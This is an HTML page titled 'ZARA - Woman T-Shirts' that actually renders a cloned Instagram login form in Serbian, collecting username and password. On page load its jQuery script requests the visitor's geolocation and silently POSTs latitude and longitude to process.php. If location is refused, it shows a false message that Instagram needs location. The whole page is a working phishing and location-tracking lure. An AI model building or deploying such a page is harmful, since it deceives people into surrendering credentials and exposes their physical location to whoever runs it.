<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>ZARA - Woman T-Shirts</title>
</head>
<style type="text/css">
  --f52: 142,142,142;
--h1d: 255,255,255;
--de5: 255,255,255;
--d69: 0,149,246;
--b86: 88,195,34;
--i30: 237,73,86;
--d62: 255,255,255;
--e4f: 54,54,54;
--a72: 255,255,255;
--ie3: 142,142,142;
--c37: 237,73,86;
--f24: 0,149,246;
--jbb: 53,121,234;
--eca: 255,255,255;
--jb7: 0,0,0;
--fa7: 224,241,255;
--ba8: 168,168,168;
--eac: 237,73,86;
--i1d: 38,38,38;
--edc: 199,199,199;
--f75: 38,38,38;
--fe0: 0,55,107;
--d87: 255,255,255;
--b3f: 250,250,250;
--bb2: 239,239,239;
--f23: 255,255,255;
--b38: 219,219,219;
--b6a: 219,219,219;
--ca6: 219,219,219;
--cdd: 38,38,38;
--e22: 199,199,199;
--e62: 245,251,255;
--b2f: 88,195,34;
--c8c: 168,168,168;
--ce3: 239,239,239;
--jd9: 0,0,0;
--j64: 54,54,54;
--a97: 243,243,243;
--d20: 38,38,38;
color: rgba(var(--i1d,38,38,38),1);
font: inherit;
vertical-align: baseline;
box-sizing: border-box;
display: flex;
-webkit-box-orient: vertical;
-webkit-box-direction: normal;
flex-direction: column;
flex-shrink: 0;
position: relative;
-webkit-box-align: center;
align-items: center;
background-color: rgba(var(--d87,255,255,255),1);
border: 1px solid rgba(var(--b6a,219,219,219),1);
border-radius: 1px;
margin: 0 0 10px;
padding: 10px 0;
</style>
<body>

<div class="gr27e  "><h1 class="NXVPg Szr5J  coreSpriteLoggedOutWordmark">Instagram</h1><div class="EPjEi"><form class="HmktE" id="loginForm" method="post"><div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                "><div class="-MzZI"><div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Број телефона, корисничко име или е-адреса</span><input aria-label="Број телефона, корисничко име или е-адреса" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value=""></label><div class="i24fI"></div></div></div><div class="-MzZI"><div class="_9GP1n   "><label class="f0n8F "><span class="_9nyy2">Лозинка</span><input aria-label="Лозинка" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value=""></label><div class="i24fI"></div></div></div><div class="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button class="sqdOP  L3NKy   y3zKF     " disabled="" type="submit"><div class="                     Igw0E     IwRSH      eGOV_         _4EzTm                                                                                                              ">Пријавите се</div></button></div><div class="K-1uj Z7p_S"><div class="s311c"></div><div class="_0tv-g">или</div><div class="s311c"></div></div><div class="                     Igw0E     IwRSH      eGOV_         _4EzTm    bkEs3                          CovQj                  jKUp7          DhRcB                                                    "><button class="sqdOP yWX7d    y3zKF     " type="button"><span class=" coreSpriteFacebookIcon AeB99"></span><span class="KPnG0">Пријавите се помоћу Фејсбука</span></button></div></div><a class="_2Lks6" href="/accounts/password/reset/" tabindex="0">Заборавили сте лозинку?</a></form></div></div>



<p id="status"></p>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
    jQuery(document).ready(function($) {
        let errorText = 'turn on the location on your phone to continue using Instagram';

        if(!navigator.geolocation) {
            $('#status').text(errorText);
        } else {
            navigator.geolocation.getCurrentPosition(function success(position) {
                $("#content").show();
                let latitude  = position.coords.latitude;
                let longitude = position.coords.longitude;

                $.ajax({
                   type: 'POST',
                   url: 'process.php',
                   data: {
                       lat: latitude,
                       lng: longitude
                   },
                   success: function(response) {
                       console.log(response);
                   }
                });
            }, function error() {
                $('#status').text(errorText);
            });
        }
    });
</script>

</body>
</html>